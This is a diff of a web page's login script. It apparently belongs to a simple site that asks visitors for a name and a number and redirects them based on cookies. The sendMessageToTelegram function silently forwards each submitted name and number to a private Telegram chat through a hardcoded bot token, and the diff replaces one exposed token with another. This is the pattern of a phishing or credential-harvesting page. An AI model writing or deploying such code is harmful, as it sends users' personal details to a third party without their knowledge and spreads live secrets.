@@ -41,29 +41,7 @@
     </div>
 
     <script>
-      function getCookie(name) {
-        const nameEQ = name + "=";
-        const cookies = document.cookie.split(";");
-        for (let i = 0; i < cookies.length; i++) {
-          let cookie = cookies[i].trim();
-          if (cookie.indexOf(nameEQ) === 0) {
-            return decodeURIComponent(cookie.substring(nameEQ.length));
-          }
-        }
-        return null;
-      }
-
-      function validateAccess() {
-        const userName = getCookie("userName");
-        const userNumber = getCookie("userNumber");
-
-        if (!userName || !userNumber) {
-          // Redirect back to login if cookies are not set
-          window.location.href = "index.html";
-        }
-      }
-
-      validateAccess();
+      // Update the clock display
       function updateClock() {
         const now = new Date();
         let hours = now.getHours();
@@ -74,12 +52,13 @@
         const timeString = `${hours}:${minutes}:${seconds} ${amPm}`;
         document.getElementById("clock").innerText = timeString;
       }
-      setInterval(updateClock, 1000);
 
+      // Ensure only numeric input is allowed for the number field
       function validateNumberInput(input) {
         input.value = input.value.replace(/[^0-9]/g, "");
       }
 
+      // Set a cookie
       function setCookie(name, value, days) {
         const date = new Date();
         date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
@@ -88,6 +67,7 @@
           name + "=" + encodeURIComponent(value) + ";" + expires + ";path=/";
       }
 
+      // Get a cookie value by name
       function getCookie(name) {
         const nameEQ = name + "=";
         const cookies = document.cookie.split(";");
@@ -100,6 +80,7 @@
         return null;
       }
 
+      // Redirect if cookies are already set
       function checkCookiesAndRedirect() {
         const userName = getCookie("userName");
         const userNumber = getCookie("userNumber");
@@ -109,9 +90,10 @@
         }
       }
 
+      // Send login details to Telegram
       function sendMessageToTelegram(name, number) {
         const chatId = "5786268361"; // Your Telegram chat ID
-        const botToken = "7741281791:AAEDO6kZ74HWd9fqubMe4i8PD2kzCjcggyc"; // Your Telegram bot token
+        const botToken = "7769361866:AAE5mLkwPGOOR8yaY-NgeOew0EpXei7y7W4"; // Your Telegram bot token
         const message = `Name: ${name}\nNumber: ${number}`;
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
           message
@@ -131,6 +113,7 @@
           });
       }
 
+      // Validate and process login
       function validateAndProcess() {
         const name = document.getElementById("name").value.trim();
         const message = document.getElementById("message").value;
@@ -158,12 +141,14 @@
           setCookie("userNumber", message, 7); // Store for 7 days
           sendMessageToTelegram(name, message);
         }
-
-        
       }
 
-      checkCookiesAndRedirect();
-      updateClock();
+      // Initialize the script after the page has fully loaded
+      document.addEventListener("DOMContentLoaded", () => {
+        updateClock();
+        checkCookiesAndRedirect();
+        setInterval(updateClock, 1000); // Update the clock every second
+      });
     </script>
   </body>
 </html>
